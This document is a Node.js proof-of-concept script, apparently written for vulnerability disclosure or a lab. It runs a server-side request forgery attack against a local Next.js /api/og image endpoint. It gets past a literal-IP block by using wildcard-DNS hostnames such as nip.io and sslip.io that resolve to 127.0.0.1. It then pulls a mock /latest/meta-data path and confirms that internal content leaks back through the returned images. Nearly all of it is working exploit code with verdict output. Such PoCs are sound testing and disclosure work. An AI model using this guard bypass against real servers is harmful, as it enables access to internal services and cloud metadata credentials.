// Runs the SSRF attack against YOUR locally-running Next server + the local
// internal-server.mjs, and prints a verdict. Everything is localhost.
//
//   node attack.mjs
//   NEXT=http://localhost:3000 INTERNAL_PORT=8079 node attack.mjs
//   IMG_HOST=127-0-0-1.sslip.io node attack.mjs        # swap the DNS vehicle
//
// IMG_HOST must be a *hostname* (not a literal IP) that resolves to the
// loopback internal service. It exists so the next/og guard's literal-IP
// check is bypassed while the fetch still lands on 127.0.0.1. Defaults to
// `127.0.0.1.nip.io` (nip.io maps <ip>.nip.io -> <ip>). If your network
// blocks nip.io, use `localtest.me`, `127-0-0-1.sslip.io`, or add a line to
// /etc/hosts (e.g. `127.0.0.1  internal.ssrf-poc.example`) and pass
// IMG_HOST=internal.ssrf-poc.example. Do NOT use `localhost`, `*.localhost`,
// or `*.local` — the guard blocks those by name (that is the point).
import crypto from 'node:crypto'
import dns from 'node:dns/promises'

const NEXT = process.env.NEXT || 'http://localhost:3000'
const IPORT = Number(process.env.INTERNAL_PORT || 8079)
const IMG_HOST = process.env.IMG_HOST || '127.0.0.1.nip.io'
const sha = (buf) =>
  crypto.createHash('sha256').update(Buffer.from(buf)).digest('hex').slice(0, 16)

const internal = (path) => `http://${IMG_HOST}:${IPORT}${path}`

async function ogFetch(imgUrl) {
  const u = `${NEXT}/api/og?title=pwn&img=${encodeURIComponent(imgUrl)}`
  try {
    const res = await fetch(u)
    const buf = await res.arrayBuffer()
    return { status: res.status, len: buf.byteLength, hash: sha(buf) }
  } catch (e) {
    // Almost always: the Next server isn't running on NEXT.
    return { status: 0, len: 0, hash: '', error: e.code || e.message }
  }
}

console.log(`target Next app : ${NEXT}/api/og`)
console.log(`internal service: http://127.0.0.1:${IPORT}  (run: npm run internal)`)
console.log(`img host (vehicle): ${IMG_HOST}\n`)

// --- DNS preflight: make the failure mode diagnostic, not mysterious --------
let resolved = null
try {
  const { address } = await dns.lookup(IMG_HOST)
  resolved = address
  console.log(`[dns] ${IMG_HOST} -> ${address}`)
} catch (e) {
  console.log(`[dns] ${IMG_HOST} did NOT resolve (${e.code || e.message}).`)
}
const loopbackish = resolved === '127.0.0.1' || resolved?.startsWith('127.')
if (!loopbackish) {
  console.log(
    `\n[!] ${IMG_HOST} does not resolve to 127.0.0.1 on this machine` +
      (resolved ? ` (got ${resolved})` : '') +
      `.\n    The public wildcard-DNS service may be blocked on your network.` +
      `\n    Fix: pass another vehicle, e.g.` +
      `\n      IMG_HOST=localtest.me node attack.mjs` +
      `\n      IMG_HOST=127-0-0-1.sslip.io node attack.mjs` +
      `\n    or add to /etc/hosts:  127.0.0.1  internal.ssrf-poc.example` +
      `\n      IMG_HOST=internal.ssrf-poc.example node attack.mjs\n`
  )
}

console.log('[1] attack, internal secret = RED  :', internal('/latest/meta-data/red'))
const red = await ogFetch(internal('/latest/meta-data/red'))
console.log('    ->', red)

console.log('[2] attack, internal secret = BLUE :', internal('/latest/meta-data/blue'))
const blue = await ogFetch(internal('/latest/meta-data/blue'))
console.log('    ->', blue)

console.log(
  '[3] control, LITERAL internal IP (guard should block):',
  `http://127.0.0.1:${IPORT}/latest/meta-data/red`
)
const ctrl = await ogFetch(`http://127.0.0.1:${IPORT}/latest/meta-data/red`)
console.log('    ->', ctrl)

console.log('\n================ VERDICT ================')
const reached = red.status === 200 && blue.status === 200
const exfil = reached && red.hash !== blue.hash
const guardActive = ctrl.status >= 400
console.log(
  'SSRF reach (og fetched the internal host)      :',
  reached ? 'YES' : 'no — is the internal service up, and does IMG_HOST resolve to loopback?'
)
console.log(
  'Internal CONTENT exfiltrated to the attacker   :',
  exfil
    ? 'YES — RED vs BLUE runs returned different PNGs, so the internal image bytes flow back'
    : 'no / inconclusive'
)
console.log(
  'Guard blocks the literal-IP control            :',
  guardActive
    ? `YES (HTTP ${ctrl.status}) — the guard is active, and the hostname bypasses it`
    : `no (HTTP ${ctrl.status}) — unexpected; the literal IP was NOT blocked`
)
console.log('=========================================')
console.log('\nWatch the `npm run internal` terminal: you will see the Next server')
console.log('reach /latest/meta-data/red and /blue (the SSRF), but NOT the literal-IP control.')
